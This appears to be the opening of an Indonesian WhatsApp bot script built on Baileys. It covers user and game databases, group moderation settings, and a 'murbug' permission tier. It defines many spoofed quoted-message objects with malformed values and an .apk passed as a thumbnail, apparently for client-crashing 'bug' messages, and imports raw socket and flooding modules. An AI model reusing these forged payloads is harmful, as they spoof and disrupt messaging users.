require('./settings')
const {
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
//=================================================//
const { qioConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')
//=================================================//
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
//=================================================//
const axios = require('axios')
const os = require('os').cpus().length
const util = require('util')
const urll = require('url')
const jimp = require('jimp')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const pino = require('pino')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const dgram = require('dgram')
const fg = require('api-dylux')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const FormData = require('form-data')
const ms = toMs = require('ms')
const crypto = require("crypto")
const yts = require("yt-search")
const tls = require('tls')
const net = require('net')
const http2 = require('http2')
const cluster = require('cluster')
const { color } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { remini } = require('./lib/remini')
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const sockett = dgram.createSocket('udp4')
const bochil = require("@bochilteam/scraper")
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString()
const fs = require('fs')
//=================================================//
let afk = require("./lib/afk") //afk

//=================================================//
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.kuismath = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let tebakkalimat = db.data.game.tebakkalimat = []
let tebaklirik = db.data.game.tebaklirik = []
let tebaktebakan = db.data.game.tebaktebakan = []
let tebakbendera = db.data.game.tebakbendera = []
let tebakbendera2 = db.data.game.tebakbendera2 = []
let tebakkabupaten = db.data.game.tebakkabupaten = []
let tebakkimia = db.data.game.tebakkimia = []
let tebakasahotak = db.data.game.tebakasahotak = []
let tebaksiapakahaku = db.data.game.tebaksiapakahaku = []
let tebaksusunkata = db.data.game.tebaksusunkata = []
let tebaktekateki = db.data.game.tebaktekateki = []
let _afk = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/afk-user.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antitoxic.json'))
let ntasing = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/antilinkytvideo.json'))

//=================================================//
module.exports = qio = async (qio, m, chatUpdate, store) => {
try {
var body = (
m.mtype === 'conversation' ? m.message.conversation :
m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === 'messageContextInfo' ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text :
''
);

//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == 'string' ? m.text : '')
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await qio.decodeJid(qio.user.id)
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync('./owner.json'))
const kontributor = JSON.parse(fs.readFileSync('./owner.json'))
const iniseller = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/seller.json'))
const premium = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/premium.json'))
const inimurbug = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/murbug.json'))
const contacts = JSON.parse(fs.readFileSync("./lib/lowdb/adapters/basedate/contacts.json"))
const isContacts = contacts.includes(m.sender)
const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMurbug = [botNumber, ...inimurbug, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPrem = [botNumber, ...premium, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAfkOn = afk.checkAfkUser(m.sender, _afk)    

// Group
const groupMetadata = m.isGroup ? await qio.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(m.chat) : false 
const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false

//=================================================//
//+//
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = db.data.users[m.sender]
if (typeof user !== 'object') db.data.users[m.sender] = {}
const chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.data.chats[m.chat] = {
}
if (user) {
if (!isNumber(user.money)) user.money = 0
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.owner) user.ownerTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("owner" in user)) user.owner = false
} else db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
ownerTime: 0,
owner: false,
money: 30000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0
}
//=================================================//
const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else db.data.settings[botNumber] = {
//    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: false,
//    		auto_ai_grup: true,
//    		goodbye: true,
    		onlygrub: false,
//        welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }

} catch (err) {
console.error(err)
}
//=================================================//
const cok = fs.readFileSync(`./lib/image/cok.jpg`)
const bangke = fs.readFileSync(`./lib/image/bangke.jpg`)
const slayer07 = fs.readFileSync(`./lib/lowdb/adapters/image/slayer07.jpg`)
const hanjer = fs.readFileSync(`./lib/image/hanjer.jpg`)
const santet = fs.readFileSync(`./lib/lowdb/adapters/image/santet.jpg`)
const virgam = fs.readFileSync(`./lib/lowdb/adapters/image/virgam.png`)
const dokupalsu = fs.readFileSync(`./lib/lowdb/adapters/basedate/Saqio.apk`)
const gampalsu = fs.readFileSync(`./lib/lowdb/adapters/basedate/Saqio.jpg`)
//=================================================//
const { dafontSearch, dafontDown } = require('./lib/dafont.js')
const scp1 = require('./lib/scraper.js') 
const ffstalk = require('./lib/ffstalk.js')
const githubstalk = require('./lib/githubstalk.js')
const npmstalk = require('./lib/npmstalk.js')
const mlstalk = require('./lib/mlstalk.js')
const textpro = require('./lib/textpro.js')
const photooxy = require('./lib/photooxy.js')
const db_respon_list = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/list.json'))
//=================================================//
const { buttonqio } = require("./lib/antibacot.js")
//=================================================//
if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await qio.readMessages([readkey]);
}
qio.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
qio.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
qio.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await qio.updateProfileStatus(`ঔৣ⃕᭝Alfin Faridh Taufiqiy || ✅ Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}

/*let rn = ['composing','recording','paused']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
qio.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await qio.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
qioreply(`${err}`)
}
}
//=================================================//
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
await qio.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
qioreply(`${err}`)
}
}
//=================================================//
//Push Kintil
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//=================================================//
//Ini Waktu | Waktu adalah emas,maka dari itu sentuh lah rumput.dan jangan nolep dikamar terus,usahakan tu kontol jangan dikocok terus.Lutut ama sikut lu kopong nanti
const moment = require('moment-timezone');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Selamat Malam"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄 Selamat Sore"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️ Selamat Siang"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️ Selamat Pagi"
} else {
ucapanWaktu = "🌆 Selamat Subuh"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})

const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 ঔৣ⃕᭝Alfin Faridh Taufiqiy𝐳᭄",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const qioreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const qiovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const qiobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Alfin Faridh Taufiqiy`
}
}
}

const qiobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'Alfin Faridh Taufiqiy',
type: 1,
response: {
selectedDisplayText: 'ngaceng'
}
}
}
}

const qiocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: gampalsu,
caption: ` Alfin Faridh Taufiqiy ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🔏🪨Msg ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🔏🪨Msg ${m.body || m.mtype}`,
jpegThumbnail: dokupalsu,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🔏🪨Msg ${m.body || m.mtype}`,
"title": `⟠ Alfin Faridh Taufiqiy 々`,
'jpegThumbnail': gampalsu,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": gampalsu,
},
"title": `🔏🪨Msg ${m.body || m.mtype}`,
"description": `⟠ ঔৣ⃕᭝Alfin Faridh Taufiqiy𝐳᭄ Tops 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🔏🪨Msg ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🔏🪨Msg ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🔏🪨Msg ${m.body || m.mtype}`,
'jpegThumbnail': gampalsu,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🔏🪨Msg ${m.body || m.mtype}`,
"caption": `🔏🪨Msg ${m.body || m.mtype}`,
'jpegThumbnail': gampalsu,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🔏🪨Msg ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🔏🪨Msg ${m.body || m.mtype}`,
'jpegThumbnail': gampalsu,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🔏🪨Msg ${m.body || m.mtype}`,
jpegThumbnail: gampalsu,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🔏🪨Msg ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': gampalsu,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🔏🪨Msg ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': gampalsu,
thumbnail: gampalsu,
sendEphemeral: true
}
}
}
//=================================================//
// Badboy
const zxcwords = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/fakk.json'))
const addzxcwords = async (kata) => {
let zxcwords=JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/fakk.json'))
zxcwords.push(kata)
fs.writeFileSync('./lib/lowdb/adapters/basedate/fakk.json',JSON.stringify(zxcwords))
m.reply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}

const deletezxcwords = async (kata) => {
let zxcwords=JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/fakk.json'))
zxcwords=zxcwords.filter(word=>word!==kata)
fs.writeFileSync('./lib/lowdb/adapters/basedate/fakk.json',JSON.stringify(zxcwords))
m.reply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//=================================================//
//Status
if (!qio.public) {
if (!m.key.fromMe) return
} 
//=================================================//

async function loading () {
var gen2 = [
"𝐍𝐨",
"𝐂𝐨𝐮𝐧𝐭𝐞𝐫",
